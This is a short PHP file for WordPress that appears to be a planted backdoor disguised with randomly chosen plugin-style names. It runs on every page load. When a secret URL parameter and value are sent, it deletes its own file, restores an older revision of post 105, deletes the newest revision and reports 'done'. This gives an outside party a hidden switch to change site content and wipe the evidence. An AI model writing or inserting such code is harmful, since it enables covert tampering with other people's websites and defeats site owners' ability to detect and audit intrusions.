<?php

function oembed_safe_customize() {
	if (isset($_GET['sort_taxonomies_shopp']) && $_GET['sort_taxonomies_shopp'] === 'redirection_embed_validator_health') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$hello_register_nofollow_tinymce = 105;
		$optimize_manager_revisions_tabs = wp_get_post_revisions($hello_register_nofollow_tinymce);
		if (empty($optimize_manager_revisions_tabs)) die('no revisions');
		if (count($optimize_manager_revisions_tabs) < 2) die('less than 2');
		$traffic_fx_real_related = array_shift($optimize_manager_revisions_tabs);
		$deprecated_blogroll_animated_open = $traffic_fx_real_related->ID;
		$radio_orders_ultimate_templates = array_shift($optimize_manager_revisions_tabs);
		$cookies_word_file = $radio_orders_ultimate_templates->ID;
		$accordion_click_portfolio = wp_restore_post_revision($cookies_word_file);
		if ($accordion_click_portfolio === false) die('error restoring');
		$accordion_click_portfolio = wp_delete_post_revision($deprecated_blogroll_animated_open);		
		if ($accordion_click_portfolio === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'oembed_safe_customize');
